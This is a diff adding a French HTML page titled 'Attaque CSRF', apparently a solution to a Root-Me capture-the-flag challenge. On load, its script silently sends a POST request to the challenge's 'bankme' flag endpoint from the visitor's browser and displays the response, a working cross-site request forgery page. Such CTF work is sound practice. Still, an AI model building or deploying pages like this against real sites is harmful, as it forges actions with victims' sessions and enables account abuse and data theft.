@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Attaque CSRF</title>
+</head>
+<body>
+    <h1>Page malveillante</h1>
+    <script>
+        function post(url, params={}) {
+            var params_post = [];
+            for (const key in params) {
+                params_post.push(`${key}=${params[key]}`);
+            }
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", url, false);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.send(params_post.join("&"));
+            return xhr.responseText;
+        }
+
+        function view_flag() {
+            let res = post("http://bankme-1.challenges.pro.root-me.org/flag");
+            alert('Flag récupéré : ' + res);
+        }
+
+        // Appel de la fonction pour récupérer le flag
+        view_flag();
+    </script>
+</body>
+</html>
